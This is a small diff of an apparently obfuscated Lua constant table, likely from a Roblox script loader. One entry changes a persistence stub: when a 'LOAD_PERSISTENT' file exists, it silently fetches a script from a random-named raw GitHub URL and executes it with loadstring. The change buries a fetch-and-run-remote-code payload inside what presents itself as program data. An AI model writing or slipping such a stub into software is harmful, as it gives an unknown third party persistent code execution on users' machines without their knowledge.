@@ -93647,7 +93647,7 @@ function Backend.loadProgramData()
         [3248] = 15052,
         [3249] = 394,
         [3250] = 12553,
-        [3251] = '\t\tif (not isfile("LOAD_PERSISTENT")) then\n\t\t\treturn;\n\t\tend;\n\t\tscript_key, SILENT = "%s", isfile("LOAD_SILENTLY");\n\t\tloadstring(game:HttpGet("sc0pesv5"))();\n\t\t',
+        [3251] = '\t\tif (not isfile("LOAD_PERSISTENT")) then\n\t\t\treturn;\n\t\tend;\n\t\tscript_key, SILENT = "%s", isfile("LOAD_SILENTLY");\n\t\tloadstring(game:HttpGet("https://raw.githubusercontent.com/WzRCc/xk7vq2m9zr4wxk7vq2m9zr4w8f3j6t1n5c0d/refs/heads/main/a9xk4v2m7zr1w8f3j6t5n0c4d2q8s.lua"))();\n\t\t',
         [3252] = -19023,
         [3253] = 'get_server',
         [3254] = 'GetObjects',
